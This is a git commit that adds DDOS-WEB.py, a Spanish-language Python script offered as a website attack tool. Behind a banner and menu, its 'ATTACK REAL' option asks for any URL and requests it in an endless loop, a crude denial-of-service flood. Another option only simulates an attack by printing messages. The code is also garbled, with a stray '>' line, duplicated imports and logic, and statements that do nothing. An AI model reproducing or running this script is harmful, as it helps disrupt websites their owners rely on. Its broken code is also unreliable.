b9d8ccbaa52f77efe3072a94557992576f27af81
scriptskali <104281088+scriptskali@users.noreply.github.com>
2022-04-23 23:50:41 -0400

    Update and rename DDBOT.py to DDOS-WEB.py

---
+++ DDOS-WEB.py
@@ -0,0 +1,58 @@
+
+import requests
+import os
+BLACK = '\033[30m'
+RED = '\033[31m'
+GREEN = '\033[32m'
+YELLOW = '\033[33m'
+BLUE = '\033[34m'
+MAGENTA = '\033[35m'
+CYAN = '\033[36m'
+WHITE = '\033[37m'
+RESET = '\033[39m'
+os.system("clear")
+print(GREEN+"▒█▀▀▄ ▒█▀▀▄ ▒█▀▀▀█ ▒█▀▀▀█ ░░ ▒█░░▒█ ▒█▀▀▀ ▒█▀▀█")
+print("▒█░▒█ ▒█░▒█ ▒█░░▒█ ░▀▀▀▄▄ ▀▀ ▒█▒█▒█ ▒█▀▀▀ ▒█▀▀▄")
+print("▒█▄▄▀ ▒█▄▄▀ ▒█▄▄▄█ ▒█▄▄▄█ ░░ ▒█▄▀▄█ ▒█▄▄▄ ▒█▄▄█")
+
+print("///////////////////ATTACK-WEB//////////////////")
+print("creador:s.c.r.i.p.t.s.k.a.l.i")
+print("tik tok:s.c.r.i.p.t.s.k.a.l.i")
+print("///////////////////ATTACK-DEMO/////////////////")
+
+a = int(input("1.- ATTACK SIMULADOR\n2.-DDOS <\nseleccione una opcion: "))
+
+if a == 1:
+    print('ponga la pagina web aqui')
+elif a == 2:    print("ponga la pagina web aqui")
+                                                                                                                                                                                >
+import requests
+import os
+
+if a == 1:
+    print ("↓↓↓↓↓↓↓↓↓↓↓↓↓")
+    a = input("página wep: ")
+    b = 0
+    while True:
+      print((b), "|", "atacando página >", (a))
+      b = b+1
+
+
+
+
+a = int(input("1.-ATTACK REAL\nseleccione: "))
+
+
+import  requests
+url = input("URL de la Pagina:")
+while True:
+    r = requests.get(url)
+    r.history
+    r.status_code
+    200
+    r.url
+    (url)
+    try:
+     print(GREEN+"[+]mandando attackes ah  ", (url))
+    except:
+        print(GREEN+"[-]ERROR SRRY")
